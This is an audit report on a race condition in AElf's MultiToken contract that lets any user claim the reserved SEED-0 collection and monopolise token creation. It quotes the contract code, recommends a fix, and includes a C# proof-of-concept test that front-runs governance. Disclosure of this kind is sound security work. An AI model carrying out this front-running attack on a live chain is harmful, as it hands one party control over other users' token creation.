# Audit Report

## Title
Race Condition Allows Unauthorized SEED-0 Collection Creation Leading to Token Creation Monopoly

## Summary
The AElf MultiToken contract contains a critical race condition vulnerability that allows any user to claim ownership of the SEED-0 NFT collection before governance. The SEED-0 collection symbol is explicitly exempted from seed NFT requirements during token creation, but no access control restricts who can create it. Since SEED-0 is not created at genesis and only its owner can mint SEED NFTs (which are required for all token creation by non-whitelisted users), the first user to create SEED-0 gains monopoly control over the entire token creation system.

## Finding Description

The vulnerability exists across multiple contract locations and stems from a design flaw in the token creation bootstrap mechanism.

**1. SEED-0 Reserved Symbol Without Protection**

The constant `SeedCollectionSymbol` is defined as "SEED-0" [1](#0-0) , but `GetSymbolType()` performs only format validation without checking for reserved symbols [2](#0-1) .

**2. Explicit SEED-0 Exemption from Seed NFT Requirement**

The `CreateToken()` method contains logic that exempts SEED-0 from the seed NFT requirement. When a non-whitelisted user attempts token creation, the condition `input.Symbol != TokenContractConstants.SeedCollectionSymbol` at line 57 evaluates to false for "SEED-0", causing the seed NFT validation to be skipped entirely [3](#0-2) .

**3. SEED-0 Not Created at Genesis**

The `InitialEconomicSystem()` method only creates native, resource, and election tokens during genesis initialization [4](#0-3) . The `TokenContractInitializationProvider` similarly does not include SEED-0 creation [5](#0-4) , leaving a window where any user can claim it.

**4. Owner-Only SEED NFT Minting**

Only the SEED-0 collection owner can create individual SEED NFTs, as enforced by the owner check in `CreateNFTInfo()` [6](#0-5) .

**5. Duplicate Creation Prevention**

Once SEED-0 is created, the duplicate check in `CheckTokenExists()` prevents any subsequent attempts to create it [7](#0-6) .

**Attack Execution Path:**

1. Chain deploys â†’ Genesis initialization completes without creating SEED-0
2. Attacker monitors chain deployment and calls `Create()` [8](#0-7)  with `Symbol="SEED-0"` before governance can act
3. `GetSymbolType("SEED-0")` returns `SymbolType.NftCollection`, routing to `CreateNFTCollection()`
4. In `CreateToken()`, the exemption logic allows creation without a seed NFT
5. Attacker becomes permanent owner of SEED-0 (duplicate prevention blocks recreation)
6. All future token creation by non-whitelisted users requires burning SEED NFTs, which only the attacker can mint

**Whitelist Analysis:**

While `IsAddressInCreateWhiteList()` exempts certain system contracts from seed NFT requirements [9](#0-8) , the SEED-0 exemption at line 57 of `TokenContract_Actions.cs` applies to **all users**, not just whitelisted addresses. The condition structure `if (!IsAddressInCreateWhiteList(Context.Sender) && input.Symbol != TokenContractConstants.SeedCollectionSymbol)` means that when the symbol IS "SEED-0", the entire validation block is skipped regardless of whitelist status.

## Impact Explanation

**Critical - Complete Token Creation System Compromise:**

- **Operational DoS**: Legitimate users cannot create tokens without the attacker's permission since they need SEED NFTs that only the attacker can mint
- **Monopoly Control**: The attacker gains exclusive authority over which tokens can exist on the chain
- **Governance Bypass**: Even governance organizations cannot create tokens without SEED NFTs from the attacker
- **Economic Extortion**: The attacker can demand payment for SEED NFT issuance or selectively censor token creation
- **Chain Integrity**: The permissionless nature of the blockchain is fundamentally compromised

The token creation system is a core blockchain operation. Monopoly control over it effectively breaks the decentralization guarantee and allows single-entity censorship of all new tokens.

## Likelihood Explanation

**HIGH - Trivial to Execute:**

- **Public Access**: The `Create()` method has no access control restrictions
- **Minimal Preconditions**: Only requires that SEED-0 hasn't been created yet (true immediately after genesis)
- **Attack Complexity**: Single transaction with standard parameters
- **Economic Cost**: Only gas fees (minimal)
- **Detection Difficulty**: Once executed, the attack is irreversible due to duplicate prevention
- **Race Window**: Window exists between chain deployment and governance action to create SEED-0
- **Monitoring**: Attacker can monitor mempool or chain state to front-run governance

The vulnerability is exploitable immediately upon chain deployment with a single transaction that any user can submit.

## Recommendation

**Immediate Fix - Add Access Control to SEED-0 Creation:**

Modify `CreateToken()` to restrict SEED-0 creation to whitelisted addresses only:

```csharp
if (symbolType == SymbolType.Token || symbolType == SymbolType.NftCollection)
{
    // can not call create on side chain
    Assert(State.SideChainCreator.Value == null,
        "Failed to create token if side chain creator already set.");
    
    // CRITICAL FIX: Only whitelisted addresses can create SEED-0
    if (input.Symbol == TokenContractConstants.SeedCollectionSymbol)
    {
        Assert(IsAddressInCreateWhiteList(Context.Sender),
            "Only authorized addresses can create SEED collection.");
    }
    else if (!IsAddressInCreateWhiteList(Context.Sender))
    {
        var symbolSeed = State.SymbolSeedMap[input.Symbol.ToUpper()];
        CheckSeedNFT(symbolSeed, input.Symbol);
        long balance = State.Balances[Context.Sender][symbolSeed];
        DoTransferFrom(Context.Sender, Context.Self, Context.Self, symbolSeed, balance, "");
        Burn(Context.Self, symbolSeed, balance);
    }
}
```

**Additional Hardening:**

1. Create SEED-0 during genesis initialization in `EconomicContract.InitialEconomicSystem()` or `TokenContractInitializationProvider`
2. Add explicit validation in `GetSymbolType()` to detect and handle reserved symbols
3. Implement governance-controlled SEED-0 creation through a dedicated initialization method

## Proof of Concept

```csharp
[Fact]
public async Task VulnerabilityPoC_AnyoneCanClaimSeed0()
{
    // Simulate post-genesis state where SEED-0 doesn't exist
    var attackerStub = GetTester<TokenContractImplContainer.TokenContractImplStub>(
        TokenContractAddress, AttackerKeyPair);
    
    // Attacker creates SEED-0 before governance
    var result = await attackerStub.Create.SendAsync(new CreateInput
    {
        Symbol = "SEED-0",
        Decimals = 0,
        TotalSupply = 1,
        IsBurnable = true,
        TokenName = "Malicious SEED Collection",
        Issuer = AttackerAddress,
        Owner = AttackerAddress,
        ExternalInfo = new ExternalInfo()
    });
    
    result.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify attacker owns SEED-0
    var tokenInfo = await attackerStub.GetTokenInfo.CallAsync(
        new GetTokenInfoInput { Symbol = "SEED-0" });
    tokenInfo.Owner.ShouldBe(AttackerAddress);
    
    // Verify governance cannot recreate SEED-0 (duplicate check)
    var governanceStub = GetTester<TokenContractImplContainer.TokenContractImplStub>(
        TokenContractAddress, DefaultKeyPair);
    var governanceResult = await governanceStub.Create.SendWithExceptionAsync(new CreateInput
    {
        Symbol = "SEED-0",
        Decimals = 0,
        TotalSupply = 1,
        IsBurnable = true,
        TokenName = "Legitimate SEED Collection",
        Issuer = DefaultAddress,
        Owner = DefaultAddress
    });
    
    governanceResult.TransactionResult.Error.ShouldContain("Token already exists");
    
    // Verify only attacker can create SEED NFTs
    var seedNftResult = await attackerStub.Create.SendAsync(new CreateInput
    {
        Symbol = "SEED-1",
        Decimals = 0,
        TotalSupply = 1,
        IsBurnable = true,
        TokenName = "SEED NFT 1",
        Issuer = AttackerAddress,
        Owner = AttackerAddress,
        ExternalInfo = new ExternalInfo
        {
            Value =
            {
                {"__seed_owned_symbol", "NEWTOKEN"},
                {"__seed_exp_time", "9999999999"}
            }
        }
    });
    
    seedNftResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify governance cannot create SEED NFTs (owner check fails)
    var govSeedResult = await governanceStub.Create.SendWithExceptionAsync(new CreateInput
    {
        Symbol = "SEED-2",
        Decimals = 0,
        TotalSupply = 1,
        IsBurnable = true,
        TokenName = "SEED NFT 2",
        Issuer = DefaultAddress,
        Owner = DefaultAddress,
        ExternalInfo = new ExternalInfo
        {
            Value =
            {
                {"__seed_owned_symbol", "GOVTOKEN"},
                {"__seed_exp_time", "9999999999"}
            }
        }
    });
    
    govSeedResult.TransactionResult.Error.ShouldContain("NFT owner must be collection's owner");
}
```

## Notes

This vulnerability represents a **critical flaw in the token creation bootstrap mechanism**. The SEED-0 exemption was likely intended to allow system contracts to bootstrap the SEED system without circular dependency, but the implementation fails to restrict this exemption to authorized addresses. The combination of (1) no genesis creation, (2) public access to `Create()`, (3) exemption from seed NFT requirements, and (4) duplicate prevention creates a race condition with permanent, irreversible consequences for the entire chain's token economy.

### Citations

**File:** contract/AElf.Contracts.MultiToken/TokenContractConstants.cs (L23-23)
```csharp
    public const string SeedCollectionSymbol = "SEED-0";
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_NFTHelper.cs (L7-14)
```csharp
    private SymbolType GetSymbolType(string symbol)
    {
        var words = symbol.Split(TokenContractConstants.NFTSymbolSeparator);
        Assert(words[0].Length > 0 && IsValidCreateSymbol(words[0]), "Invalid Symbol input");
        if (words.Length == 1) return SymbolType.Token;
        Assert(words.Length == 2 && words[1].Length > 0 && IsValidItemId(words[1]), "Invalid NFT Symbol input");
        return words[1] == TokenContractConstants.CollectionSymbolSuffix ? SymbolType.NftCollection : SymbolType.Nft;
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L33-46)
```csharp
    public override Empty Create(CreateInput input)
    {
        var inputSymbolType = GetSymbolType(input.Symbol);
        if (input.Owner == null)
        {
            input.Owner = input.Issuer;
        }
        return inputSymbolType switch
        {
            SymbolType.NftCollection => CreateNFTCollection(input),
            SymbolType.Nft => CreateNFTInfo(input),
            _ => CreateToken(input)
        };
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L56-65)
```csharp
            if (!IsAddressInCreateWhiteList(Context.Sender) &&
                input.Symbol != TokenContractConstants.SeedCollectionSymbol)
            {
                var symbolSeed = State.SymbolSeedMap[input.Symbol.ToUpper()];
                CheckSeedNFT(symbolSeed, input.Symbol);
                // seed nft for one-time use only
                long balance = State.Balances[Context.Sender][symbolSeed];
                DoTransferFrom(Context.Sender, Context.Self, Context.Self, symbolSeed, balance, "");
                Burn(Context.Self, symbolSeed, balance);
            }
```

**File:** contract/AElf.Contracts.Economic/EconomicContract.cs (L16-40)
```csharp
    public override Empty InitialEconomicSystem(InitialEconomicSystemInput input)
    {
        Assert(!State.Initialized.Value, "Already initialized.");

        State.TokenContract.Value =
            Context.GetContractAddressByName(SmartContractConstants.TokenContractSystemName);

        Context.LogDebug(() => "Will create tokens.");
        CreateNativeToken(input);
        CreateResourceTokens();
        CreateElectionTokens();

        Context.LogDebug(() => "Finished creating tokens.");

        InitialMiningReward(input.MiningRewardTotalAmount);

        RegisterElectionVotingEvent();
        SetTreasurySchemeIdsToElectionContract();

        InitializeTokenConverterContract();
        State.TokenContract.InitialCoefficients.Send(new Empty());
        State.TokenContract.InitializeAuthorizedController.Send(new Empty());
        State.Initialized.Value = true;
        return new Empty();
    }
```

**File:** src/AElf.Kernel.Token/TokenContractInitializationProvider.cs (L24-129)
```csharp
    public virtual List<ContractInitializationMethodCall> GetInitializeMethodList(byte[] contractCode)
    {
        var methodList = new List<ContractInitializationMethodCall>();
        var initializationData = _tokenContractInitializationDataProvider.GetContractInitializationData();

        // For the main chain, we use the economic contract to initialize the token contract.
        // So no initialization methods are required in here.
        // But for the side chain, which has no economic contract, we need initialize token contract.
        if (initializationData != null)
        {
            var nativeTokenInfo = TokenInfo.Parser.ParseFrom(initializationData.NativeTokenInfoData);
            var resourceTokenList =
                TokenInfoList.Parser.ParseFrom(initializationData.ResourceTokenListData);

            // native token
            methodList.Add(new ContractInitializationMethodCall
            {
                MethodName = nameof(TokenContractContainer.TokenContractStub.Create),
                Params = GenerateTokenCreateInput(nativeTokenInfo).ToByteString()
            });

            // resource token
            foreach (var resourceTokenInfo in resourceTokenList.Value)
                methodList.Add(new ContractInitializationMethodCall
                {
                    MethodName = nameof(TokenContractContainer.TokenContractStub.Create),
                    Params = GenerateTokenCreateInput(resourceTokenInfo).ToByteString()
                });

            methodList.Add(new ContractInitializationMethodCall
            {
                MethodName = nameof(TokenContractContainer.TokenContractStub.InitialCoefficients),
                Params = new Empty().ToByteString()
            });

            if (initializationData.PrimaryTokenInfoData != null)
            {
                // primary token
                var chainPrimaryTokenInfo =
                    TokenInfo.Parser.ParseFrom(initializationData.PrimaryTokenInfoData);

                methodList.Add(new ContractInitializationMethodCall
                {
                    MethodName = nameof(TokenContractContainer.TokenContractStub.Create),
                    Params = GenerateTokenCreateInput(chainPrimaryTokenInfo, initializationData.Creator)
                        .ToByteString()
                });

                foreach (var issueStuff in initializationData.TokenInitialIssueList)
                    methodList.Add(new ContractInitializationMethodCall
                    {
                        MethodName = nameof(TokenContractContainer.TokenContractStub.Issue),
                        Params = new IssueInput
                        {
                            Symbol = chainPrimaryTokenInfo.Symbol,
                            Amount = issueStuff.Amount,
                            Memo = "Initial issue",
                            To = issueStuff.Address
                        }.ToByteString()
                    });

                methodList.Add(new ContractInitializationMethodCall
                {
                    MethodName = nameof(TokenContractContainer.TokenContractStub.SetPrimaryTokenSymbol),
                    Params = new SetPrimaryTokenSymbolInput
                    {
                        Symbol = chainPrimaryTokenInfo.Symbol
                    }.ToByteString()
                });
            }
            else
            {
                // set primary token with native token 
                methodList.Add(new ContractInitializationMethodCall
                {
                    MethodName = nameof(TokenContractContainer.TokenContractStub.SetPrimaryTokenSymbol),
                    Params = new SetPrimaryTokenSymbolInput
                    {
                        Symbol = nativeTokenInfo.Symbol
                    }.ToByteString()
                });
            }

            methodList.Add(new ContractInitializationMethodCall
            {
                MethodName = nameof(TokenContractContainer.TokenContractStub.InitializeFromParentChain),
                Params = new InitializeFromParentChainInput
                {
                    ResourceAmount = { initializationData.ResourceAmount },
                    RegisteredOtherTokenContractAddresses =
                    {
                        initializationData.RegisteredOtherTokenContractAddresses
                    },
                    Creator = initializationData.Creator
                }.ToByteString()
            });

            methodList.Add(new ContractInitializationMethodCall
            {
                MethodName = nameof(TokenContractContainer.TokenContractStub.InitializeAuthorizedController),
                Params = ByteString.Empty
            });
        }

        return methodList;
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_NFT_Actions.cs (L35-37)
```csharp
        var owner = nftCollectionInfo.Owner ?? nftCollectionInfo.Issuer;
        Assert(Context.Sender == owner && owner == input.Owner, "NFT owner must be collection's owner");
        if (nftCollectionInfo.Symbol == TokenContractConstants.SeedCollectionSymbol)
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L295-303)
```csharp
    private void CheckTokenExists(string symbol)
    {
        var empty = new TokenInfo();
        // check old token
        var existing = GetTokenInfo(symbol);
        Assert(existing == null || existing.Equals(empty), "Token already exists.");
        // check new token
        Assert(!State.InsensitiveTokenExisting[symbol.ToUpper()], "Token already exists.");
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Views.cs (L259-265)
```csharp
    private bool IsAddressInCreateWhiteList(Address address)
    {
        return address == Context.GetZeroSmartContractAddress() ||
               address == GetDefaultParliamentController().OwnerAddress ||
               address == Context.GetContractAddressByName(SmartContractConstants.EconomicContractSystemName) ||
               address == Context.GetContractAddressByName(SmartContractConstants.CrossChainContractSystemName);
    }
```
